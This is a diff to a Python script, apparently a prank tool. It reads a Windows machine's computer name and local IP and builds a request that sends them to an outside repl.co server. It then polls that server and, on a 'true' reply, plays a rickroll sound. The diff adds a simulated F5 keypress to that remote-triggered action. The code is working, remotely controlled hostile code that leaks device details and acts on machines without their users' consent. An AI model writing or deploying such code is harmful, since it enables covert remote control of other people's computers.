@@ -5,6 +5,8 @@ import threading
 import time
 import winsound
 
+import keyboard
+
 device = os.environ["COMPUTERNAME"]
 room = socket.gethostbyname(socket.gethostname())
 url = 'https://api.balstudent101.repl.co/add?name={}&room={}'.format(str(device), str(room))
@@ -22,7 +24,10 @@ def threadFunc():
     state = "true"
     if state in resp:
         print("Running")
-        winsound.PlaySound('ricky.wav', winsound.SND_FILENAME)
+        try:
+            keyboard.press('f5')
+        finally:
+            winsound.PlaySound('ricky.wav', winsound.SND_FILENAME)
     # by only providing an if statement above, we stop the possibility of an unwanted accident
     print("attack? " + resp)
     time.sleep(1)
